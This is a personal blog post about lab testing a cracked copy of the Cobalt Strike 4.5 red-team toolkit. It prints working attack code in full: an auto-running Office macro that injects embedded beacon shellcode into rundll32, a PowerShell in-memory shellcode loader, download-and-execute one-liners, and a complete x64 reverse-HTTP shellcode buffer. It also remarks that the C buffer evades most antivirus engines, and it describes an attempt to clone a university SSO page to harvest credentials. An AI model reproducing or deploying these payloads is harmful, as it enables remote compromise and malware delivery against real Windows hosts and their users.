---
draft: false

title: 'Playing With Cobalt Strike'
date: 2022-02-11

description: 'Fun with Cobalt Strike v4.5'
tags: ['red-team']
---

Ah, [*Cobalt Strike*](https://www.cobaltstrike.com/), HelpSystems' infamous (but legitimate) Red Teaming product coopted by attackers worldwide for malicious purposes. For those unfamiliar, Cobalt Strike is an adversarial toolkit. Its official capacity in the security industry is to simulate attacks for testing purposes. Of course, as is perhaps expected, given the prompt release of each new version to the Internet, those with less noble intentions also make use of the software.

By certain means, I have obtained a copy of Cobalt Strike version 4.5, released on December 14th, 2021. As this is a recent, licensed version, I was curious about which type of malicious operations I could successfully perform and the code behind them. Of course, as with all content posted on my website, education is the only objective. I carried out all testing in a cloud lab environment, and I suggest you do the same should you follow my processes here. Enjoy!

![Screenshot of Cobalt Strike 4.5 'About' Page](/img/playing-with-cobalt-strike-1.webp)

## Environment

I prefer to host my testing machines off-site, especially when dealing with unverified software, such as my copy of Cobalt Strike. To facilitate that, Google's Cloud Compute Engine comes in handy. Unfortunately, due to licensing agreements with Microsoft, it is cheaper to run Windows hosts in Azure, so I have split my network like so:

```
Google Cloud VPC
└ Cobalt Strike (Debian 10)
Azure VPC
└ Victim Host (Windows 10)
```

## Microsoft Office Macro

### Generation

Microsoft recently announced that [they will disable MS Office macros embedded in files downloaded from the Internet by default](https://arstechnica.com/gadgets/2022/02/microsoft-will-block-downloaded-macros-in-office-versions-going-back-to-2013/) — it's about time. Office macro attacks are so common that Cobalt Strike even has a dedicated button to allow for their simple generation.

![Screenshot of Cobalt Strike MS Office Macro Generator](/img/playing-with-cobalt-strike-2.webp)

Of course, I first have to set up a "listener," something for my macro to contact. Luckily, HelpSystems provides their users (and abusers) with a set of [well-detailed documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm). I decided to use `windows/beacon_http/reverse_http` as my payload, configured as shown below.

![Screenshot of Listener for Macro](/img/playing-with-cobalt-strike-3.webp)

Upon generation of the macro, Cobalt Strike displayed macro deployment instructions. Red teaming is fool-proof these days!

![Screenshot of Macro Deployment Instructions](/img/playing-with-cobalt-strike-4.webp)

Here is the source code of the macro:

```vb
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If
    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _
-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _
104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _
-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _
-1,-1,47,110,56,115,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,53,46,48,59,32,76,66, _
66,82,79,87,83,69,82,41,13,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _
104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _
-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,51,53,46,49,57,55,46,48,46,54,50,0,0,0,0,0)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
```

[**VirusTotal Report**](https://www.virustotal.com/gui/file/b34401bb9834a33d7234a33fe7becf8002a557ed595b5664ba95cdfaa061f919/detection)

15 of 59 antivirus programs capable of processing macro-loaded Excel files reported malicious activity from the script above, including Microsoft Defender. Thus, I will likely have to turn off Microsoft Defender to run the macro. Avast's YARA Rule contributions specifically identified the maco as originating from Cobalt Strike.

I found the absence of my IP address within the code particularly interesting. I assume it can be reconstructed from the obfuscated code by using the values in `myArray` since a plain address would be easy to find and flag as malicious. I have censored my IP in screenshots thus far — if you can reconstruct it from that array, please [send me an email](mailto:contact@swlacy.com?subject=Playing%20With%20Cobalt%20Strike%20IP%20Address). I would love to know!

### Execution

Here comes the fun part: let's test the functionality of the macro. The software specifications of the Windows victim can be seen in the screenshot below. *Sidenote: I find it disturbing that links to TikTok, mobile games, and Roblox are included in the Start Menu even in Azure images. What a nightmare.*

![Screenshot of Cobalt Strike MS Office Macro Generator](/img/playing-with-cobalt-strike-5.webp)

Microsoft Defender immediately quarantined my Excel file upon saving it with the macro — annoying for my purposes, but a good thing nonetheless. However, many businesses do not remain vigilant when considering malware mitigation processes such as updating antivirus signatures, so the code generated by Cobalt Strike still poses a serious threat.

![Screenshot of Cobalt Strike MS Office Macro Generator](/img/playing-with-cobalt-strike-6.webp)

Disabling Defender allowed me to proceed, and... Exploitation was successful! From here, a variety of options were available, including the ability to upload files, attempt privilege escalation, and more. Fascinating stuff. Unfortunately, not all features worked as expected, but I am not sure if this is due to a misconfiguration on my part or whether some of the exploits Cobalt Strike attempted have been patched by Microsoft.

![Screenshot of Cobalt Strike MS Office Macro Generator](/img/playing-with-cobalt-strike-7.webp)

## PowerShell Script

Using the same listener, I generated the following PowerShell script in Cobalt Strike.


```powershell
Set-StrictMode -Version 2

function func_get_proc_address {
        Param ($var_module, $var_procedure)
        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
                [Parameter(Position = 1)] [Type] $var_return_type = [Void]
        )

        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
        $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

        return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
        [Byte[]]$var_code = [System.Convert]::FromBase64String('<VERY long Base64 string>')
        for ($x = 0; $x -lt $var_code.Count; $x++) {
                $var_code[$x] = $var_code[$x] -bxor 35
        }

        $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
        $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
        [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

        $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
        $var_runme.Invoke([IntPtr]::Zero)
}
```

[**VirusTotal Report**](https://www.virustotal.com/gui/file/eaf823b675b9c9a0a3868c827f650f5612a2f42d34a77b1392fff4a1ccd7f990/detection)

Many more antivirus engines (32/59) detected this script than the Excel macro. Examining the code, you may notice the `[Byte[]]$var_code = [System.Convert]::FromBase64String('<VERY long Base64 string>')` line; while the *code* is relatively short, the Base64 string contained within it exceeds 350,000 characters, so I did not include the full output. Using alternative encoding is a classic malware obfuscation tactic, and I am not surprised to see it employed here.

Using, `[System.Convert]::FromBase64String()` I decoded the Base64 string, which revealed a massive set of numbers. It appears that these numbers are bitwise XORed with `35` (ASCII '#') to reconstruct the malicious commands. As shown by the VirusTotal report, this process was not complex enough to prevent widespread detection by updated AV engines.

As with the Excel macro, running this script on the victim host also established a tunnel back to Cobalt Strike.

## Special Delivery

Certain situations may present themselves in which an attacker has difficulty planting a file into the victim's environment; thus, HelpSystems has established alternative delivery methods. One such method is *Scripted Web-Delivery,* an all-in-one setup that hosts a malicious file and provides one-liners in different languages to automate fetching and executing the file on the victim host.

![Screenshot of Cobalt Strike Scripted Web-Delivery](/img/playing-with-cobalt-strike-8.webp)

Victim one-liners, given a payload of `windows/beacon_http/reverse_http`:
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://X.X.X.X:80/a'))"
```
```python
python -c "import urllib2; exec urllib2.urlopen('http://X.X.X.X:80/a').read();"
```

Windows Defender identifies the PowerShell threat as `TrojanDropper:PowerShell/Cobacis.B`.

## More Stuff

### C Payload

Using the Payload Generator, Cobalt Strike will form a buffer array in several different languages. An example of this is shown below in C, though Java, Python, Perl, PowerShell, and more are supported as well.

```c
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x43\x41\x63\x76\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x53\x45\x53\x29\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x33\x35\x2e\x31\x39\x37\x2e\x30\x2e\x36\x32\x00\x00\x00\x00\x00";
```

Since it is just an array, [**it is undetectable by any of the AV engines on VirusTotal**](https://www.virustotal.com/gui/file/692d0a21d6d0336294512c5b9a5aa614a301ff618252b9bd6c8eee3415931a04/community) (though it is included in Avast's YARA Ruleset). This has huge security implications — this shellcode can be embedded in other programs to great effect.

I wrapped the buffer array in a small C function for compilation purposes and submitted the binary to VirusTotal, which then yielded [four detections](https://www.virustotal.com/gui/file/e15f98297dc5b89128387c95de8014c4182623ad4c50ed85c318fb0240a1e0e5/detections), a pitifully small amount nonetheless.

### Foreign Connection?

While I was toying with the Scripted Web-Delivery functionality, I noticed I received a new connection to my Cobalt Strike team server, however, from a computer I do not own! I ran a WHOIS lookup against the IP address; as it happened, the instance that connected to my Cobalt Strike session is part of Autonomous System Number 9808: Guangdong Province, China. is this some kind of reverse attack, I wonder? Perhaps Cobalt Strike has vulnerabilities of its own.

![Screenshot of Strange Connection](/img/playing-with-cobalt-strike-9.webp)

I attempted to find any sort of information about the host by executing CS Beacon commands on it — after all, they had invited themselves onto my doorstep — but all attempts timed out. Very odd. If anyone has more information about why this happened, I would love to hear from you [over email](mailto:contact@swlacy.com?subject=Cobalt%20Strike%20Foreign%20Connection)!

### Report Exporting

As Cobalt Strike is intended to be a testing utility, it comes packaged with various features that would befit a penetration tester. One example of this is the report export tool, which generates report documents based on logged activity. Various reports can be generated, such as the IoCs and Hosts PDFs below.

![Screenshot of IoC Report](/img/playing-with-cobalt-strike-10.webp)
![Screenshot of Hosts Report](/img/playing-with-cobalt-strike-11.webp)

### Webpage Cloning

Cobalt Strike also supports webpage cloning, allowing not only for payload injection upon visiting a cloned website, but also credential and activity harvesting. Unfortunately, I was not able to get this to work properly with modern websites, try as I did with my university's SSO portal.

![Screenshot of Cloned WWU SSO Webpage](/img/playing-with-cobalt-strike-12.webp)

## Wrapping Up

HelpSystems has provided no shortage of features with Cobalt Strike — that is indisputable. What I have shown here is only a small subset of Cobalt Strike's functionality, and I intend to expand on more of the possibilities in the future.

While I believe it is important to provide penetration testers with polished toolsets, these sorts of applications — Metasploit and Burp Suite included — present a very low barrier to entry for the aspiring cybercriminal. I am not suggesting they should be removed by any means, but it is an important topic to think about. Modern red teaming utilities have evolved to such a degree, abstracting technical concepts, that even beginners have a shot at breaching or infecting corporate systems. It's an interesting debate, and ironic that criminals use the very tools we employ for protection as part of their attack frameworks.